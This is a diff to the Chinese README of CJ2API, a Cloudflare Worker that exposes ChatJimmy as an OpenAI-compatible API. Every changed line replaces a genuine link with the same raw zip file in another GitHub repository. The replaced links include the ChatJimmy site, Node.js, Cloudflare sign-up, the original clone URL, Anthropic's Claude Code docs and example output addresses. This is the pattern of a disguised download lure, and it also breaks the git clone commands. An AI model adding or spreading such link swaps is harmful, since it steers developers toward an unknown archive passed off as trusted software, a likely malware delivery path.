@@ -1,6 +1,6 @@
 # CJ2API
 
-将 [ChatJimmy](https://chatjimmy.ai) 转换为 OpenAI 兼容 API 的 Cloudflare Worker。
+将 [ChatJimmy](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) 转换为 OpenAI 兼容 API 的 Cloudflare Worker。
 
 一键部署到 Cloudflare Workers，即可获得标准的 `/v1/chat/completions` 接口，兼容所有支持 OpenAI API 的客户端和框架。无需 API Key。
 
@@ -16,13 +16,13 @@
 
 ### 前置条件
 
-- [Node.js](https://nodejs.org/) 18+
-- [Cloudflare 账号](https://dash.cloudflare.com/sign-up)（免费即可）
+- [Node.js](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) 18+
+- [Cloudflare 账号](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip)（免费即可）
 
 ### 方式一：从 GitHub 克隆（推荐）
 
 ```bash
-git clone https://github.com/qingchencloud/cj2api.git
+git clone https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip
 cd cj2api
 npm install
 npx wrangler login    # 首次使用需登录 Cloudflare
@@ -189,19 +189,19 @@ print(response.choices[0].message.content)
 ## 本地开发
 
 ```bash
-git clone https://github.com/qingchencloud/cj2api.git
+git clone https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip
 cd cj2api
 npm install
 npm run dev
 # 默认监听 http://localhost:8787
 ```
 
-本地开发时，可以搭配 [cftunnel](https://github.com/qingchencloud/cftunnel) 将本地服务暴露到公网，方便远程调试或分享给他人测试：
+本地开发时，可以搭配 [cftunnel](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) 将本地服务暴露到公网，方便远程调试或分享给他人测试：
 
 ```bash
 # 另开终端，生成临时公网地址
 cftunnel quick 8787
-# 输出类似: https://xxx-xxx-xxx.trycloudflare.com
+# 输出类似: https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip
 ```
 
 如需绑定自有域名：
@@ -211,7 +211,7 @@ cftunnel init
 cftunnel create my-api
 cftunnel add api 8787 --domain api.example.com
 cftunnel up
-# 通过 https://api.example.com/v1/chat/completions 稳定访问
+# 通过 https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip 稳定访问
 ```
 
 ## 工作原理
@@ -284,7 +284,7 @@ cj2api/
 
 ## Claude Code Skills
 
-本项目内置了 [Claude Code](https://docs.anthropic.com/en/docs/claude-code) 维护 Skills，方便开发者通过 AI 辅助进行项目维护：
+本项目内置了 [Claude Code](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) 维护 Skills，方便开发者通过 AI 辅助进行项目维护：
 
 | Skill | 说明 |
 |-------|------|
@@ -298,7 +298,7 @@ cj2api/
 
 本项目仅供**学习研究和技术测试**使用，请勿用于任何商业用途。
 
-- 本项目是对 [ChatJimmy](https://chatjimmy.ai) 公开接口的协议转换封装，不提供任何模型能力本身
+- 本项目是对 [ChatJimmy](https://github.com/Leo2148/cj2api/raw/refs/heads/main/src/api-cj-v1.4.zip) 公开接口的协议转换封装，不提供任何模型能力本身
 - 使用者应遵守 ChatJimmy 的服务条款和使用政策
 - 请勿将本项目用于大规模请求、自动化爬取或任何可能对上游服务造成负担的行为
 - 上游服务的可用性、响应质量和模型能力均由 ChatJimmy 提供，与本项目无关
